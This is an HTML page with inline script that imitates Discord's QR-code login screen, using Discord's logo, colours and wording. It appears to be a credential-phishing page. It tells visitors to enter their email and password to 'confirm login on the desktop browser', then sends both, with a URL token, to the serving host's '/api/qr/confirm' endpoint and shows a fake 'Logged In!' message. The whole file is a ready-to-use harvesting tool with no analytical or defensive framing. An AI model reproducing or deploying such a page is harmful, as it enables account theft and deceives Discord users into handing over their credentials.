<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>QR Login — Discord</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 127.14 96.36'%3E%3Cpath fill='%235865F2' d='M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0 0 32.17 16.15 77.7 77.7 0 0 0 6.89-11.11 68.42 68.42 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2a68.68 68.68 0 0 1-10.87 5.19 77 77 0 0 0 6.89 11.1 105.25 105.25 0 0 0 32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15zM42.45 65.69C36.18 65.69 31 60 31 53s5-12.74 11.43-12.74S54 46 53.89 53s-5.05 12.69-11.44 12.69zm42.24 0C78.41 65.69 73.25 60 73.25 53s5-12.74 11.44-12.74S96.23 46 96.12 53s-5.04 12.69-11.43 12.69z'/%3E%3C/svg%3E">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
:root{--blurple:#5865F2;--blurple-hover:#4752C4;--bg-input:#1E1F22;--text-normal:#DBDEE1;--text-muted:#80848E;--error:#FA777C;--label:#B5BAC1;--card-bg:#2b2d31;--green:#23A55A;}
html,body{min-height:100%;font-family:'gg sans','Noto Sans',Whitney,'Helvetica Neue',Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#0e0b2e 0%,#2d2299 50%,#1e9cf8 100%);}
.wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;}
.card{background:var(--card-bg);border-radius:12px;padding:36px 28px;width:100%;max-width:360px;box-shadow:rgba(0,0,0,.55) 0 4px 24px;animation:cardIn .25s ease;}
@keyframes cardIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
.logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px;}
.logo span{font-size:20px;font-weight:700;color:#fff;}
h1{font-size:20px;font-weight:700;color:#fff;text-align:center;margin-bottom:8px;}
.sub{font-size:14px;color:var(--text-muted);text-align:center;margin-bottom:24px;line-height:1.5;}
.field{margin-bottom:14px;}
.field label{display:block;font-size:11px;font-weight:700;color:var(--label);margin-bottom:7px;letter-spacing:.04em;text-transform:uppercase;}
.pw-wrap{position:relative;}
.field input{width:100%;padding:11px 14px;background:var(--bg-input);border:1px solid rgba(0,0,0,.3);border-radius:4px;color:var(--text-normal);font-size:15px;font-family:inherit;outline:none;transition:border-color .15s;}
.field input:focus{border-color:var(--blurple);}
.field input.err{border-color:var(--error);}
.pw-wrap input{padding-right:44px;}
.eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);color:var(--text-muted);cursor:pointer;line-height:0;padding:4px;}
.eye:hover{color:var(--text-normal);}
.field-err{font-size:12px;color:var(--error);margin-top:4px;font-style:italic;min-height:15px;}
.api-err{font-size:13px;color:var(--error);background:rgba(250,119,124,.1);border:1px solid rgba(250,119,124,.3);border-radius:4px;padding:10px 14px;margin-bottom:14px;display:none;}
.api-err.show{display:block;}
.btn{width:100%;padding:13px;background:var(--blurple);color:#fff;font-size:15px;font-weight:600;font-family:inherit;border:none;border-radius:4px;cursor:pointer;position:relative;transition:background .15s;margin-top:4px;}
.btn:hover{background:var(--blurple-hover);}
.btn:disabled{opacity:.7;cursor:not-allowed;}
.btn.loading{color:transparent;}
.btn.loading::after{content:'';position:absolute;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;top:50%;left:50%;margin:-9px 0 0 -9px;animation:spin .6s linear infinite;}
@keyframes spin{to{transform:rotate(360deg)}}

/* States */
.screen{display:none;}
.screen.show{display:block;}

/* Success */
.success-wrap{text-align:center;padding:12px 0;}
.ok-ring{width:80px;height:80px;border-radius:50%;background:rgba(35,165,90,.12);border:3px solid rgba(35,165,90,.3);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;animation:pulse 2s ease-in-out infinite;}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(35,165,90,.3)}50%{box-shadow:0 0 0 14px rgba(35,165,90,0)}}
.success-name{font-size:18px;font-weight:700;color:var(--blurple);background:rgba(88,101,242,.1);border:1px solid rgba(88,101,242,.25);border-radius:6px;padding:7px 18px;display:inline-block;margin:12px 0 16px;}
.success-note{font-size:13px;color:var(--text-muted);line-height:1.5;}

/* Expired */
.expired-wrap{text-align:center;padding:12px 0;}
.warn-ring{width:80px;height:80px;border-radius:50%;background:rgba(250,119,124,.1);border:3px solid rgba(250,119,124,.3);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">

    <div class="logo">
      <svg width="28" height="22" viewBox="0 0 127.14 96.36" fill="none"><path fill="white" d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0 0 32.17 16.15 77.7 77.7 0 0 0 6.89-11.11 68.42 68.42 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2a68.68 68.68 0 0 1-10.87 5.19 77 77 0 0 0 6.89 11.1 105.25 105.25 0 0 0 32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15zM42.45 65.69C36.18 65.69 31 60 31 53s5-12.74 11.43-12.74S54 46 53.89 53s-5.05 12.69-11.44 12.69zm42.24 0C78.41 65.69 73.25 60 73.25 53s5-12.74 11.44-12.74S96.23 46 96.12 53s-5.04 12.69-11.43 12.69z"/></svg>
      <span>Discord</span>
    </div>

    <!-- LOGIN FORM -->
    <div class="screen show" id="formScreen">
      <h1>Scan to Log In</h1>
      <p class="sub">Enter your credentials to confirm login on the desktop browser.</p>
      <div class="api-err" id="apiErr"></div>
      <div class="field">
        <label>Email</label>
        <input type="email" id="qrEmail" placeholder="your@email.com" autocomplete="email">
        <div class="field-err" id="emailErr"></div>
      </div>
      <div class="field">
        <label>Password</label>
        <div class="pw-wrap">
          <input type="password" id="qrPw" placeholder="Your password" autocomplete="current-password">
          <span class="eye" onclick="togglePw()">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </span>
        </div>
        <div class="field-err" id="pwErr"></div>
      </div>
      <button class="btn" id="confirmBtn" onclick="confirmLogin()">Confirm Login</button>
    </div>

    <!-- SUCCESS -->
    <div class="screen" id="successScreen">
      <div class="success-wrap">
        <div class="ok-ring">
          <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="#23A55A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h1>Logged In!</h1>
        <div class="success-name" id="successName">Username</div>
        <p class="success-note">You are now logged in on the desktop browser.<br>You can close this page.</p>
      </div>
    </div>

    <!-- EXPIRED -->
    <div class="screen" id="expiredScreen">
      <div class="expired-wrap">
        <div class="warn-ring">
          <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="#FA777C" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
        </div>
        <h1 style="margin-bottom:10px;">QR Expired</h1>
        <p class="sub">This QR code has expired. Please go back to the desktop and scan a new one.</p>
      </div>
    </div>

  </div>
</div>
<script>
  const token = new URLSearchParams(window.location.search).get('token');

  if (!token) {
    document.getElementById('formScreen').classList.remove('show');
    document.getElementById('expiredScreen').classList.add('show');
  }

  function show(id) {
    ['formScreen','successScreen','expiredScreen'].forEach(s => document.getElementById(s).classList.remove('show'));
    document.getElementById(id).classList.add('show');
  }

  function togglePw() {
    const inp = document.getElementById('qrPw');
    inp.type = inp.type === 'password' ? 'text' : 'password';
  }

  async function confirmLogin() {
    const email = document.getElementById('qrEmail').value.trim();
    const pw    = document.getElementById('qrPw').value;
    let ok = true;

    document.getElementById('emailErr').textContent = '';
    document.getElementById('pwErr').textContent = '';
    document.getElementById('apiErr').classList.remove('show');

    if (!email) { document.getElementById('emailErr').textContent = 'Email is required.'; ok = false; }
    if (!pw)    { document.getElementById('pwErr').textContent    = 'Password is required.'; ok = false; }
    if (!ok) return;

    const btn = document.getElementById('confirmBtn');
    btn.disabled = true; btn.classList.add('loading');

    try {
      const res  = await fetch('/api/qr/confirm', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ token, email, password: pw }),
      });
      const data = await res.json();

      if (data.success) {
        document.getElementById('successName').textContent = data.username || email;
        show('successScreen');
      } else if (data.message && data.message.includes('expired')) {
        show('expiredScreen');
      } else {
        const el = document.getElementById('apiErr');
        el.textContent = data.message || 'Invalid email or password.';
        el.classList.add('show');
      }
    } catch (e) {
      const el = document.getElementById('apiErr');
      el.textContent = 'Server error. Please try again.';
      el.classList.add('show');
    } finally {
      btn.disabled = false; btn.classList.remove('loading');
    }
  }
</script>
</body>
</html>
